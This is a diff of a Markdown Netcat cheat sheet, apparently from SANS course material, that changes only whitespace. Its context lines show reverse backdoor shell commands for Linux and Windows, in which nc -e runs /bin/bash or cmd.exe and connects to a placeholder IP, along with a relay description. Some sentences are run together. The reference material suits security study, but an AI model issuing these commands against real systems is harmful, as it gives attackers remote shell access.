@@ -1,4 +1,4 @@
-# Netcat
+#  Netcat
 
 To start, enter a temporary directory where we will create .bat files:
 
@@ -131,12 +131,16 @@ $ nc [YourIPaddr] [port] –e /bin/bash
 Reverse backdoor shell on Windows:
 C:\> nc [YourIPaddr] [port] –e cmd.exe Create a relay that sends packets from the
 connection to [PreviousHopIPaddr] on port
+
 [port] to a Netcat client connected to
+
 [NextHopIPaddr] on port [port2]
 Create a reverse shell that will attempt to connect to
 [YourIPaddr] on local port [port]. This shell
 can then be captured using a fundamental nc listener
+
 Purpose
+
 This cheat sheet provides various tips for
 using Netcat on both Linux and Unix,
 specifically tailored to the SANS 504, 517,
